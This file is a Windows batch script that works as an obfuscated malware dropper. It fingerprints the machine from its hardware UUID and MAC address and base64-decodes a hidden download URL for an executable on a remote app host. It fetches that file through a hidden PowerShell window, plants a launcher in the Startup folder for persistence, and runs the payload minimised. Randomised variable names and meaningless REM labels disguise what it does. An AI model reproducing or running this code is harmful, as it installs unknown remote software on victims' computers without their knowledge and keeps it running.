@echo off
REM Hnd119
setlocal EnableDelayedExpansion
REM Init757
REM Mod937

REM [6ea2a3cf6254451a5a107498a6697b07]

set "nVEtNnuW=A586A8CA4868074F4933278549DCB6A3"
set "TJQhkFan=MVbgRhBVEsG|aHR0cHM6Ly93ZWItcHJvZHVjdGlvbi05ZDdjYy51cC5yYWlsd2F5LmFwcC9jbGllbnQuZXhl"


REM Hnd842
for /f "tokens=2 delims==" %%l in ('wmic csproduct get uuid /value 2^>nul') do set "IXKMMRag=%%l"
REM Proc975
for /f "tokens=2 delims==" %%p in ('wmic nic where "NetEnabled=true" get MACAddress /value 2^>nul ^| find ":"') do set "XXLFTSoe=%%p"
set "bKlMFelc=%IXKMMRag%%XXLFTSoe%"
REM Svc879
for /f %%d in ('powershell -c "[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes('%bKlMFelc%'))).Replace('-','').Substring(0,16)"') do set "axrwoTjG=%%d"


REM Pasta com nome hash de 10 caracteres
set "EGGKWyZM=%LOCALAPPDATA%\6pa6vzhdym"
if not exist "%EGGKWyZM%" mkdir "%EGGKWyZM%"

REM Ver949
echo %nVEtNnuW%> "%EGGKWyZM%\.id"
echo %axrwoTjG%>> "%EGGKWyZM%\.id"

REM Svc463
for /f "tokens=2 delims=|" %%a in ("%TJQhkFan%") do set "HeAvWZwC=%%a"
for /f %%b in ('powershell -c "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%HeAvWZwC%'))"') do set "TJQhkFan=%%b"

REM Init358

if not exist "%EGGKWyZM%\c1fejbw7s0.exe" (
    powershell -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%TJQhkFan%','%EGGKWyZM%\c1fejbw7s0.exe')"
)


REM Chk241
set "QUcRcTNh=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%QUcRcTNh%\6pa6vz.bat" (
    echo @echo off> "%QUcRcTNh%\6pa6vz.bat"
    echo start "" /min "%EGGKWyZM%\c1fejbw7s0.exe">> "%QUcRcTNh%\6pa6vz.bat"
)

REM Chk626
start "" /min "%EGGKWyZM%\c1fejbw7s0.exe"
exit /b 0

REM [9F10DA20C7D1DED57F8BEBF7]
